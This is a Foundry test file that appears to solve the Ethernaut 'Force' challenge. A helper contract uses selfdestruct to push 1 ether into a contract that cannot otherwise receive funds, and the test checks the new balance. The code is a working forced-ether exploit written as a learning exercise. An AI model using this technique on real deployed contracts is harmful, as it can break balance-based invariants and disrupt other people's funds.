// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Force.sol";

contract Forcer {
    function selfDestruct(address payable target) public payable {
        selfdestruct(target);
    }
}

contract ForceTest is Test {
    Force force;
    Forcer forcer;
    address alice = makeAddr("alice");

    function setUp() public {
        force = new Force();
        forcer = new Forcer();

        vm.deal(alice, 1 ether);
    }

    function test() public {
        assertEq(address(force).balance, 0);

        vm.startPrank(alice);
        forcer.selfDestruct{value: 1 ether}(payable(address(force)));

        assertEq(address(force).balance, 1 ether);
    }
}